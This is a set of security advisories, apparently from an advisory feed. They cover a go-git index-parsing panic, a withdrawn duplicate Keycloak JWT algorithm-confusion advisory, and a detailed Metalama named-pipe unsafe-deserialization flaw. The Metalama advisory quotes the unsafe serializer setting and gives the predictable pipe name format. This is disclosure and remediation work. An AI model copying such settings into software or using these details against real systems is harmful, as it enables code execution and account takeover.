An attacker able to supply a crafted `.git/index` file can cause applications using go-git to panic while reading the index. If the application does not recover from panics, this results in process termination, leading to a denial-of-service (DoS) condition.

Exploitation requires the ability to modify or inject a Git index file within the local repository in disk. This typically implies write access to the `.git` directory.

### Patches

Users should upgrade to `v5.17.1`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.

### Credit

go-git maintainers thank @kq5y for finding and reporting this issue privately to the `go-git` project.

new.summary: Duplicate Advisory: Authentication bypass via jwt algorithm confusion
new.details:
### Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-j97h-3f8r-mrjr. This link is maintained to preserve external references.

### Original Description
A flaw was found in Keycloak. This JWT algorithm confusion vulnerability in the JWT Authorization Grant flow allows an attacker with valid client credentials to bypass signature verification. By forging an assertion, the attacker can create unauthorized access tokens. This enables the attacker to impersonate any federated user linked to the affected Identity Provider, leading to unauthorized access and potential privilege escalation.

new.summary: Metalama: Unsafe deserialization over Metalama's Visual Studio inter-process named pipe enables local code execution
new.details:
## Summary

Metalama uses a local named-pipe channel to communicate between its Visual Studio processes — the Visual Studio UI process (`devenv`), the out-of-process Roslyn code-analysis process, and the CodeLens process. This channel deserialized messages from the pipe **without restricting which CLR types could be instantiated**. A local process able to write to the pipe can send a crafted message that instantiates arbitrary .NET types — a deserialization primitive in the same class as `BinaryFormatter` (CWE-502), and a well-known gadget-chain code-execution vector.

The flaw is present, via two successive serializers, in **every Metalama release from the first public version (2023.0) up to and including 2026.1.18**, and is fixed in **2026.1.19**.

The pipe name is predictable: `Metalama_{role}_{processId}_{hash(PackageVersion)}`, derived from the public package version and a locally-enumerable process id. This channel is used by the Visual Studio integration only (Windows named pipes); it is not used for command-line / MSBuild builds.

## Mechanisms

**JSON era — Metalama 2023.0 through 2026.0.x (Newtonsoft.Json).** The pipe formatter enabled polymorphic type embedding:
```csharp
formatter.JsonSerializer.TypeNameHandling = TypeNameHandling.All;   // ServiceEndpoint.cs (early), later BaseEndpoint.cs
```
The accompanying `SerializationBinder` (added later for multi-version assembly support) only **remapped assembly names**; its `BindToType` resolved **any** type name from the wire (`assembly.GetType(typeName)`) with **no type allow-list**. `TypeNameHandling.All` is the canonical unsafe-deserialization setting and has publicly available gadget chains (e.g. ysoserial.net), so this era is at least as exploitable as the later one. (Introduced by commit `0554368737`, first shipped in `release/2023.0.101-rc`.)

**MessagePack era — Metalama 2026.1.0 through 2026.1.18.** The 2026.1 line migrated the pipe serialization to MessagePack (PR #1299, commit `117b607805`, 2026-01-29), using **typeless** MessagePack (`TypelessObjectResolver`), which likewise embeds CLR type names on the wire and instantiates arbitrary types on receipt — again with no allow-list.

Both mechanisms share the same channel, the same predictable pipe name, the same impact, and the same access preconditions.

## Impact

Potential arbitrary code execution inside the Visual Studio process that hosts the affected component (the UI process, the code-analysis process, or the CodeLens process), with full loss of confidentiality, integrity and availability within that process.

**Mitigating factor (limits practical severity to Medium):** the pipe is created with the default Windows ACL (no explicit `PipeSecurity`), which permits **only same-user processes to write**. All of the Visual Studio processes involved run as the same logged-in developer, so exploitation requires the attacker to already be executing code as that same user. There is **no privilege escalation** and no crossing of a security boundary; the practical value is code execution inside the developer's Visual Studio session (lateral movement / persistence within an already same-user-compromised context). This is why the practical severity is **Medium** despite the CVSS base score.

## Severity

CVSS v3.1: `AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H` = **7.3 (High)** base score; **practical severity Medium**, because the attacker gains no privilege beyond what they already had (same user, same Visual Studio session).

CVSS v4.0 cross-check: `CVSS:4.0/AV:L/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` = 7.0 (High). The Subsequent-System metrics are None because no security boundary is crossed.

## Affected products and remediation

All affected products are part of the Visual Studio integration.

| Product | Affected | Remediation |
|---|---|---|
| NuGet `Metalama.Framework` | all `< 2026.1.19` | upgrade to **2026.1.19** (no backports) |
| VS extension `PostSharpTechnologies.PostSharp` ("Metalama + PostSharp", maintained) | **2024.1 - 2026.1.4** | update to **2026.1.5** (bundles Metalama 2026.1.19) |
| VS extension `PostSharpTechnologies.Metalama` (retired) | all versions | uninstall / migrate to PostSharp `>= 2026.1.5` |
| VS extension `PostSharpTechnologies.caravela` (retired) | all versions | uninstall / migrate to PostSharp `>= 2026.1.5` |

The PostSharp extension was a separate, Metalama-free product before the 2024.1 merge (Metalama.Vsx issue #33843), so earlier PostSharp versions are not affected. GitHub has no Visual Studio Marketplace ecosystem, so only the NuGet package appears in the structured "Affected products" list.

## Fix

Fixed in Metalama **2026.1.19** (commit `d97f52e1b5`, PR #1651): the type-name deserialization is wrapped in `RpcContractMessagePackOptions`, which enforces a `[RpcContract]` type allow-list on the wire; pipe access is restricted to the current user. The fix reaches the maintained Visual Studio extension in version **2026.1.5**. The retired Caravela and Metalama extensions will not be fixed.
